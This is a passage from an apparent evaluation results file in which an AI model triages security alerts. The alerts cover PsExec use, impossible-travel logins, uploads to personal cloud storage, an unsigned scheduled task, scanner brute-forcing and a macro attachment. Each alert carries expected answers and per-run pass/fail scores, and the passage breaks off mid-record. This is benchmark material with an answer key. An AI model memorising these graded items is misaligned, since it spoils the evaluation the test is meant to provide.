+              "detail": "Contact adm-user3 and the maintenance change owner to confirm the PsExec run on srv-app-04 was intended. Review adm-user3 logons on it-jump-01 and any other remote execution from that host in the last 24 hours. If unconfirmed, reset adm-user3 credentials and isolate it-jump-01 for investigation."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 3,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Medium",
+            "classification": "needs_investigation",
+            "confidence": "medium",
+            "summary": "PsExec was run from the IT jump host to srv-app-04 as SYSTEM, executing only a benign recon command (ipconfig /all), during a maintenance window. However, the account adm-user3 is not on any change ticket, so the activity cannot be tied to authorized work and could be misuse of an admin account or lateral movement recon.",
+            "evidence": [
+              {
+                "field": "in_maintenance_window",
+                "value": "true",
+                "why": "The activity occurred during an approved maintenance window, which supports a benign administrative explanation."
+              },
+              {
+                "field": "source_host",
+                "value": "it-jump-01",
+                "why": "The origin is a known IT jump host, the expected place for admin remote tooling, which leans benign."
+              },
+              {
+                "field": "command_line",
+                "value": "psexec \\\\srv-app-04 -s cmd.exe /c ipconfig /all",
+                "why": "The command is low-impact network info gathering, but the -s flag runs as SYSTEM and ipconfig /all is typical early recon in lateral movement, so it is ambiguous."
+              },
+              {
+                "field": "account_on_change_ticket",
+                "value": "false",
+                "why": "The account is not listed on any change ticket, so the activity is unauthorized or undocumented, pointing toward malicious or policy-violating use."
+              },
+              {
+                "field": "account",
+                "value": "adm-user3",
+                "why": "An admin account used for remote execution without a ticket warrants verification that the owner performed it and that credentials are not compromised."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Contact the owner of adm-user3 and the change manager to confirm whether this PsExec run to srv-app-04 was authorized. Review adm-user3 logons to it-jump-01 and other PsExec/remote service activity from that host and account. If it is not confirmed, reset adm-user3 credentials and investigate srv-app-04."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        }
+      ]
+    },
+    {
+      "id": "alert-011",
+      "expected": {
+        "severity": "Medium",
+        "classification": "needs_investigation",
+        "action_type": "escalate",
+        "needs_human_review": true,
+        "must_cite_fields": [
+          "second_login_via_corporate_vpn",
+          "device_registered"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Medium",
+            "classification": "needs_investigation",
+            "confidence": "low",
+            "summary": "Account user-0142 logged in from Frankfurt and then from Singapore 40 minutes later, which is physically impossible without a proxy. The second login came through the corporate VPN, which could explain the location mismatch, but it used an unregistered device. The signals conflict, so this needs analyst review rather than a guess.",
+            "evidence": [
+              {
+                "field": "second_login_via_corporate_vpn",
+                "value": "true",
+                "why": "The corporate VPN can egress in another region, so the Singapore location may be a VPN exit point and not the user's real location. This points to benign activity."
+              },
+              {
+                "field": "minutes_between",
+                "value": "40",
+                "why": "Travel between Frankfurt and Singapore in 40 minutes is impossible, so one of the logins is either relayed or not the real user. This points to malicious activity or a geolocation artifact."
+              },
+              {
+                "field": "device_registered",
+                "value": "false",
+                "why": "The login came from an unregistered device, which is consistent with a stolen credential or session being used from an attacker's machine. This points to malicious activity."
+              },
+              {
+                "field": "first_login_location",
+                "value": "Frankfurt",
+                "why": "The Frankfurt login is the baseline location. We need to confirm whether it is the user's normal location and whether it was also VPN or device based."
+              },
+              {
+                "field": "second_login_location",
+                "value": "Singapore",
+                "why": "Singapore may be a VPN egress node or an attacker location. Check VPN logs to see whether the session was assigned to this user and from which source IP."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Escalate to L2. Check VPN authentication logs to confirm that user-0142 authenticated to the VPN at the time of the Singapore login, and identify the source IP behind the VPN session. Verify the unregistered device with the user or their manager. Review MFA results and any post-login activity for both sessions. If the VPN session cannot be tied to the user, reset credentials and revoke active sessions."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Confidence is low",
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 2,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Medium",
+            "classification": "needs_investigation",
+            "confidence": "medium",
+            "summary": "Account user-0142 logged in from Frankfurt and then Singapore 40 minutes apart, which is physically impossible without a proxy. The second login came through the corporate VPN, which may explain the location mismatch, but it came from an unregistered device, which is a risk sign. The signals conflict, so an analyst should verify with the user before deciding.",
+            "evidence": [
+              {
+                "field": "second_login_via_corporate_vpn",
+                "value": "true",
+                "why": "Corporate VPN egress points can make a login appear to come from a distant location, so this points to a benign explanation for the impossible travel."
+              },
+              {
+                "field": "minutes_between",
+                "value": "40",
+                "why": "Travel from Frankfurt to Singapore in 40 minutes is not possible, so one login is either routed through a VPN or proxy or is not the real user."
+              },
+              {
+                "field": "device_registered",
+                "value": "false",
+                "why": "The login came from a device that is not registered, which fits account compromise or stolen credentials and points to malicious activity."
+              },
+              {
+                "field": "first_login_location",
+                "value": "Frankfurt",
+                "why": "Without context on the user's usual location, we cannot tell which login is the normal one."
+              },
+              {
+                "field": "second_login_location",
+                "value": "Singapore",
+                "why": "This may reflect a VPN exit node in Singapore rather than the user's real position, so VPN logs should be checked."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Check VPN logs to confirm user-0142 authenticated to the corporate VPN and from which source IP. Contact the user to confirm both logins and find out what the unregistered device is. If the user denies the Singapore login or the VPN session cannot be tied to them, reset credentials and revoke active sessions."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 3,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Medium",
+            "classification": "needs_investigation",
+            "confidence": "low",
+            "summary": "Account user-0142 logged in from Frankfurt and then Singapore 40 minutes apart, which is physically impossible without a proxy. The second login came through the corporate VPN, which could explain the location mismatch, but it was from an unregistered device. The signals conflict, so this needs analyst review rather than a guess.",
+            "evidence": [
+              {
+                "field": "second_login_via_corporate_vpn",
+                "value": "true",
+                "why": "A corporate VPN exit node in Singapore could explain the apparent travel, which points to benign activity."
+              },
+              {
+                "field": "device_registered",
+                "value": "false",
+                "why": "The login came from an unregistered device, which is consistent with account compromise or session misuse and points to malicious activity."
+              },
+              {
+                "field": "minutes_between",
+                "value": "40",
+                "why": "Frankfurt to Singapore in 40 minutes is not physically possible, so one login is either routed through a VPN/proxy or not the legitimate user."
+              },
+              {
+                "field": "first_login_location",
+                "value": "Frankfurt",
+                "why": "Baseline location for comparison. It is unknown whether this is the user's usual location, so the home location should be checked."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Ask the analyst to confirm with user-0142 or their manager whether they used the corporate VPN and a new device. Check VPN logs for a matching session at the second login time and whether MFA was satisfied. Review post-login activity such as mailbox rules and data access. If the user cannot confirm, reset credentials and revoke active sessions."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Confidence is low",
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        }
+      ]
+    },
+    {
+      "id": "alert-012",
+      "expected": {
+        "severity": "High",
+        "classification": "needs_investigation",
+        "action_type": "escalate",
+        "needs_human_review": true,
+        "must_cite_fields": [
+          "user_baseline_upload_mb_per_day",
+          "dest_category"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Medium",
+            "classification": "needs_investigation",
+            "confidence": "medium",
+            "summary": "User user-0377 sent about 8.4 GB to a personal cloud storage service. That is only modestly above their unusually high daily upload baseline of about 6.5 GB, so it may be normal for this user. Personal cloud storage is a common data exfiltration path, and the alert alone cannot show what was uploaded or whether it was authorized.",
+            "evidence": [
+              {
+                "field": "bytes_out",
+                "value": "8400000000",
+                "why": "About 8.4 GB left the network in one transfer, which is large enough to matter if the data was sensitive."
+              },
+              {
+                "field": "user_baseline_upload_mb_per_day",
+                "value": "6500",
+                "why": "The user's normal upload volume is about 6.5 GB/day, so 8.4 GB is roughly 1.3x baseline. This points toward benign or routine behavior and is not a dramatic spike."
+              },
+              {
+                "field": "dest_category",
+                "value": "personal_cloud_storage",
+                "why": "Uploads to unsanctioned personal storage are a typical exfiltration channel and may violate data handling policy, which points toward possible malicious or policy-violating activity."
+              },
+              {
+                "field": "dest_host",
+                "value": "files.personal-cloud.example.com",
+                "why": "This is a consumer-style file hosting destination, not a known corporate-approved service, so the destination needs verification against the sanctioned app list."
+              },
+              {
+                "field": "user",
+                "value": "user-0377",
+                "why": "The user's role and whether they have a legitimate need to move large files (for example media or backups) must be confirmed, since the baseline alone does not prove the activity is authorized."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Escalate to L2 or the insider-risk team. Check the user's role and any approved business need, review proxy/DLP logs for file names and types sent to 203.0.113.120, and look at the user's recent upload history to personal storage. Contact the user or their manager to confirm intent. If the data is sensitive or the upload is unauthorized, consider blocking the destination and restricting the account."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": false,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 2,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Medium",
+            "classification": "needs_investigation",
+            "confidence": "low",
+            "summary": "User user-0377 sent about 8.4 GB to a personal cloud storage service. That is only about 1.3x their usual daily upload volume, but the destination is a personal cloud, which is a common data exfiltration channel. The alert alone cannot show whether this is routine work or data leaving the organization.",
+            "evidence": [
+              {
+                "field": "bytes_out",
+                "value": "8400000000",
+                "why": "About 8.4 GB uploaded in one event. This is a large transfer and could be bulk data staging or exfiltration."
+              },
+              {
+                "field": "user_baseline_upload_mb_per_day",
+                "value": "6500",
+                "why": "The user's normal daily upload is about 6.5 GB, so 8.4 GB is only about 1.3x baseline. This points toward benign, habitual behavior. The high baseline itself is unusual and should be understood."
+              },
+              {
+                "field": "dest_category",
+                "value": "personal_cloud_storage",
+                "why": "Personal (non-corporate) storage is a typical exfiltration destination and may violate data handling policy. It is not clearly sanctioned."
+              },
+              {
+                "field": "dest_host",
+                "value": "files.personal-cloud.example.com",
+                "why": "An unmanaged external service. The alert does not show whether the user has used it before or whether it is approved."
+              },
+              {
+                "field": "user",
+                "value": "user-0377",
+                "why": "The user's role and past use of this destination are needed to judge whether the upload fits their job, such as a backup or media workflow."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Ask the analyst or DLP team to review what was uploaded (file names, types, sensitivity) and whether user-0377 has used this destination before. Check whether the personal cloud service is sanctioned. Confirm with the user or their manager that the upload was intended. If the data is sensitive or the user cannot explain it, block the destination and begin a data loss incident."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Confidence is low",
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": false,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 3,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Medium",
+            "classification": "needs_investigation",
+            "confidence": "low",
+            "summary": "user-0377 uploaded about 8.4 GB to a personal cloud storage service. That is only about 1.3x the user's usual daily upload volume (about 6.5 GB), so the volume alone is not anomalous. However, the destination is an unsanctioned personal storage category and the alert fired at 02:10 UTC, so data exfiltration cannot be ruled out without more context.",
+            "evidence": [
+              {
+                "field": "bytes_out",
+                "value": "8400000000",
+                "why": "The transfer is about 8.4 GB, which is large in absolute terms and is a meaningful amount of data leaving to an external service."
+              },
+              {
+                "field": "user_baseline_upload_mb_per_day",
+                "value": "6500",
+                "why": "The user normally uploads about 6.5 GB per day, so 8.4 GB is only modestly above baseline. This points toward benign activity such as routine backup or sync."
+              },
+              {
+                "field": "dest_category",
+                "value": "personal_cloud_storage",
+                "why": "Personal cloud storage is a common exfiltration channel and is typically outside corporate data-handling controls. This points toward possible malicious or policy-violating activity."
+              },
+              {
+                "field": "dest_host",
+                "value": "files.personal-cloud.example.com",
+                "why": "The destination is a consumer file-hosting service and not a sanctioned corporate storage endpoint. Whether the user has legitimately used it before is unknown and needs checking."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Escalate to L2/insider-risk review. Check the proxy and DLP logs for what was uploaded (file names, types, sensitivity labels) and whether user-0377 has used this destination before. Confirm with the user or their manager whether this was an approved backup or sync, and consider the 02:10 UTC timing against the user's normal working hours. If the data is sensitive or the upload was not authorized, block the destination for the user and escalate as a data-loss incident."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Confidence is low",
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": false,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        }
+      ]
+    },
+    {
+      "id": "alert-013",
+      "expected": {
+        "severity": "Medium",
+        "classification": "needs_investigation",
+        "action_type": "escalate",
+        "needs_human_review": true,
+        "must_cite_fields": [
+          "installer_signature_status",
+          "task_binary_signed"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Medium",
+            "classification": "needs_investigation",
+            "confidence": "medium",
+            "summary": "A validly signed vendor installer created a scheduled task that points to an unsigned binary in C:\\Users\\Public on ws-sales-12. Signed installers often add update-check tasks, but an unsigned executable in a world-writable folder is a common persistence pattern, so the binary needs verification before closing.",
+            "evidence": [
+              {
+                "field": "installer_signature_status",
+                "value": "valid",
+                "why": "The parent installer has a valid signature, which supports a legitimate software install and points to benign activity."
+              },
+              {
+                "field": "task_name",
+                "value": "ExampleVendorUpdateCheck",
+                "why": "The name looks like a normal vendor update checker, which is consistent with benign installer behavior, but names are easy to spoof."
+              },
+              {
+                "field": "task_binary_signed",
+                "value": "false",
+                "why": "The binary the task runs is unsigned, so it does not share the installer's trust and could be malicious or swapped in."
+              },
+              {
+                "field": "task_binary_path",
+                "value": "C:\\Users\\Public\\updchk.exe",
+                "why": "C:\\Users\\Public is writable by any user and is not a typical install location for vendor software, a pattern often used for persistence and malware staging."
+              },
+              {
+                "field": "created_by_process",
+                "value": "setup-vendor.exe",
+                "why": "The task was created by the installer process itself, which fits an install flow, but the installer's legitimacy should be confirmed against the approved software list."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Have an analyst hash updchk.exe and check it on VirusTotal and against the vendor's published hashes. Confirm that setup-vendor.exe is approved software and was installed intentionally on ws-sales-12, then review the task's schedule and action. If the binary is not verified as vendor-supplied, isolate the host and remove the task."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 2,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Medium",
+            "classification": "needs_investigation",
+            "confidence": "medium",
+            "summary": "A validly signed installer (setup-vendor.exe) created a scheduled task named like a vendor update check, but the task runs an unsigned binary from C:\\Users\\Public, a world-writable location often used for persistence. The signals conflict, so this cannot be confirmed as benign or malicious without checking the binary and vendor details.",
+            "evidence": [
+              {
+                "field": "installer_signature_status",
+                "value": "valid",
+                "why": "The parent installer has a valid signature, which supports legitimate vendor software installation and points to benign activity."
+              },
+              {
+                "field": "task_name",
+                "value": "ExampleVendorUpdateCheck",
+                "why": "The name matches a typical vendor update-check task, which is consistent with benign installer behavior, though names are easy to spoof."
+              },
+              {
+                "field": "task_binary_signed",
+                "value": "false",
+                "why": "The binary the task executes is unsigned, which is inconsistent with a signed vendor installer and can indicate a dropped or tampered payload."
+              },
+              {
+                "field": "task_binary_path",
+                "value": "C:\\Users\\Public\\updchk.exe",
+                "why": "C:\\Users\\Public is a writable location outside Program Files and is commonly abused for persistence, which points toward malicious activity."
+              },
+              {
+                "field": "created_by_process",
+                "value": "setup-vendor.exe",
+                "why": "The task was created by the installer process, so it ties to a known install event, but the installer could be trojanized or abused to drop the binary."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Escalate to L2 to hash updchk.exe and check it against threat intel, confirm with the software owner or IT that ws-sales-12 was meant to install this vendor product, and verify the installer's publisher and download source. Review the task's schedule and command arguments and check for network activity from updchk.exe. If the hash is unknown or the install was not authorized, isolate the host and remove the task."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 3,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Medium",
+            "classification": "needs_investigation",
+            "confidence": "medium",
+            "summary": "A validly signed installer (setup-vendor.exe) created a scheduled task that runs an unsigned binary from C:\\Users\\Public on ws-sales-12. The signed installer and vendor-style task name suggest a legitimate update checker, but an unsigned executable in a world-writable directory is a common persistence pattern. The binary needs to be verified before the alert is closed.",
+            "evidence": [
+              {
+                "field": "installer_signature_status",
+                "value": "valid",
+                "why": "The parent installer has a valid signature, which supports a legitimate software install and points to benign activity."
+              },
+              {
+                "field": "task_name",
+                "value": "ExampleVendorUpdateCheck",
+                "why": "The name matches a typical vendor update-check task, which is consistent with benign installer behavior."
+              },
+              {
+                "field": "created_by_process",
+                "value": "setup-vendor.exe",
+                "why": "The task was created by the installer process during setup rather than by a script or unknown process, which fits an install workflow."
+              },
+              {
+                "field": "task_binary_signed",
+                "value": "false",
+                "why": "The binary the task executes is unsigned, so its origin cannot be verified. This is a malicious-leaning signal, especially for a persistence mechanism."
+              },
+              {
+                "field": "task_binary_path",
+                "value": "C:\\Users\\Public\\updchk.exe",
+                "why": "C:\\Users\\Public is writable by all users and is often abused for staging malware. A legitimate vendor would normally install to Program Files, so this is suspicious."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Hash updchk.exe and check it against threat intel and the vendor's published files. Confirm with the vendor or software owner that this installer is expected on ws-sales-12. Review the file's creation time and any network activity from it. If the binary cannot be verified, remove the scheduled task and isolate the host."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        }
+      ]
+    },
+    {
+      "id": "alert-014",
+      "expected": {
+        "severity": "Medium",
+        "classification": "needs_investigation",
+        "action_type": "monitor",
+        "needs_human_review": true,
+        "must_cite_fields": [
+          "scanner_registered",
+          "target_in_scan_scope"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Medium",
+            "classification": "needs_investigation",
+            "confidence": "medium",
+            "summary": "A registered internal vulnerability scanner (10.30.0.25) generated 212 failed logins against hr-portal.example.com in 5 minutes. The scanner is a known asset, but the target is outside its approved scan scope, so this may be a scan misconfiguration or a compromised or misused scanner. Intent cannot be determined from the alert alone.",
+            "evidence": [
+              {
+                "field": "scanner_registered",
+                "value": "true",
+                "why": "The source IP is a registered, known scanner, which points toward benign authorized scanning activity."
+              },
+              {
+                "field": "source_ip",
+                "value": "10.30.0.25",
+                "why": "Internal address, consistent with the scanner's expected location and not an external attacker."
+              },
+              {
+                "field": "target_in_scan_scope",
+                "value": "false",
+                "why": "The HR portal is not in the approved scan scope, so this activity is unauthorized or misconfigured and could indicate scanner compromise or misuse."
+              },
+              {
+                "field": "failed_logins",
+                "value": "212",
+                "why": "A high volume of failed logins is credential-guessing behavior, beyond typical vulnerability scanning and suspicious against a sensitive HR system."
+              },
+              {
+                "field": "window_minutes",
+                "value": "5",
+                "why": "212 attempts in 5 minutes (~42/min) is a rapid automated burst, consistent with brute force or spraying."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Contact the scanner owner/vulnerability management team to confirm whether a scan of hr-portal.example.com was intended or a scope/config error occurred. Check the scanner host for compromise or unauthorized access, review HR portal auth logs for any successful logins from 10.30.0.25 and for targeted accounts, and consider pausing the scan job until confirmed."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": false,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 2,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Medium",
+            "classification": "needs_investigation",
+            "confidence": "medium",
+            "summary": "A registered internal vulnerability scanner (10.30.0.25) generated 212 failed logins against hr-portal.example.com in 5 minutes. The source is a known scanner, but the HR portal is not in the scan scope, so this may be a scan misconfiguration or misuse of the scanner host. Scope and authorization need to be confirmed before closing or escalating as an attack.",
+            "evidence": [
+              {
+                "field": "scanner_registered",
+                "value": "true",
+                "why": "Source IP is a registered vulnerability scanner, which points to benign, authorized scanning activity."
+              },
+              {
+                "field": "source_ip",
+                "value": "10.30.0.25",
+                "why": "Internal address, so this is not external attacker traffic, though a compromised internal host would look the same."
+              },
+              {
+                "field": "target_in_scan_scope",
+                "value": "false",
+                "why": "The HR portal is outside the approved scan scope, so this activity is unauthorized or a misconfiguration, which points to malicious or risky behavior."
+              },
+              {
+                "field": "failed_logins",
+                "value": "212",
+                "why": "A high volume of failed logins suggests credential guessing or brute force, not just passive vulnerability scanning."
+              },
+              {
+                "field": "window_minutes",
+                "value": "5",
+                "why": "212 attempts in 5 minutes (about 42 per minute) is an automated, high-rate pattern that could lock out HR accounts."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Contact the vulnerability management team to confirm whether a scan job or credentialed scan was run against hr-portal.example.com at 2026-11-16T20:22Z and why it was outside scope. Check the scanner host for compromise or unauthorized use, and review HR portal logs for any successful logins from 10.30.0.25 and for locked accounts. If the scan is not confirmed, consider blocking the scanner's access to the HR portal until it is verified."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": false,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 3,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Medium",
+            "classification": "needs_investigation",
+            "confidence": "medium",
+            "summary": "A registered internal vulnerability scanner (10.30.0.25) generated 212 failed logins against hr-portal.example.com in 5 minutes. The scanner is a known asset, but the target is outside its approved scan scope, so this could be a scan misconfiguration or misuse or compromise of the scanner. Verify with the scanner owner before closing or escalating.",
+            "evidence": [
+              {
+                "field": "scanner_registered",
+                "value": "true",
+                "why": "The source IP is a known, registered scanner, which points to benign or authorized scanning activity."
+              },
+              {
+                "field": "source_ip",
+                "value": "10.30.0.25",
+                "why": "Internal address, so this is not external attack traffic, though a compromised internal host or scanner is still possible."
+              },
+              {
+                "field": "target_in_scan_scope",
+                "value": "false",
+                "why": "The HR portal is not in the approved scan scope, so this activity was not authorized and points to misconfiguration or malicious use."
+              },
+              {
+                "field": "failed_logins",
+                "value": "212",
+                "why": "A high volume of failed logins is consistent with credential brute-forcing or password spraying, not just a passive vulnerability scan."
+              },
+              {
+                "field": "window_minutes",
+                "value": "5",
+                "why": "212 attempts in 5 minutes is a rapid, automated rate, and it targets a sensitive HR system."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Contact the vulnerability scanner owner to confirm whether a scan or scope change targeted hr-portal.example.com. Check the HR portal for any successful logins from 10.30.0.25 or lockouts around 20:22Z. Check the scanner for signs of compromise or unauthorized job changes. If the owner cannot confirm the activity, treat it as a possible brute-force attempt and escalate to L2/IR."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": false,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        }
+      ]
+    },
+    {
+      "id": "alert-015",
+      "expected": {
+        "severity": "Medium",
+        "classification": "needs_investigation",
+        "action_type": "escalate",
+        "needs_human_review": true,
+        "must_cite_fields": [
+          "sender_domain_known",
+          "macro_autoexec"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "High",
+            "classification": "needs_investigation",
+            "confidence": "medium",
+            "summary": "An email from a known vendor domain carries a macro-enabled Excel file (Q4-statement.xlsm) whose macro runs automatically when opened. The known sender is a benign signal, but auto-executing macros in an unsolicited-style statement attachment are a common malware delivery method, and a compromised vendor account cannot be ruled out. Verdict needs analyst validation before anyone opens the file.",
+            "evidence": [
+              {
+                "field": "sender_domain_known",
+                "value": "true",
+                "why": "The sender domain is a known vendor, which points toward legitimate business correspondence."
+              },
+              {
+                "field": "sender",
+                "value": "accounts@vendor.example.com",
+                "why": "A generic accounts mailbox sending a statement is plausible for a vendor, but a compromised or spoofed vendor account would look the same, so this does not prove legitimacy."
+              },
+              {
+                "field": "attachment_has_macro",
+                "value": "true",
+                "why": "Macro-enabled .xlsm files are a common malware delivery vehicle, and invoices or statements are usually sent as PDF or plain xlsx."
+              },
+              {
+                "field": "macro_autoexec",
+                "value": "true",
+                "why": "The macro runs automatically on open (e.g., Auto_Open or Workbook_Open), which is a strong malicious indicator and rarely needed for a statement document."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Hold or quarantine the email and do not open the attachment. Contact the vendor through a known, separate channel to confirm they sent Q4-statement.xlsm. Detonate the file in a sandbox or extract the macro code for review, and check whether any recipient has already opened it. If any recipient did, isolate that host and escalate to incident response."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": false,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 2,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "High",
+            "classification": "needs_investigation",
+            "confidence": "medium",
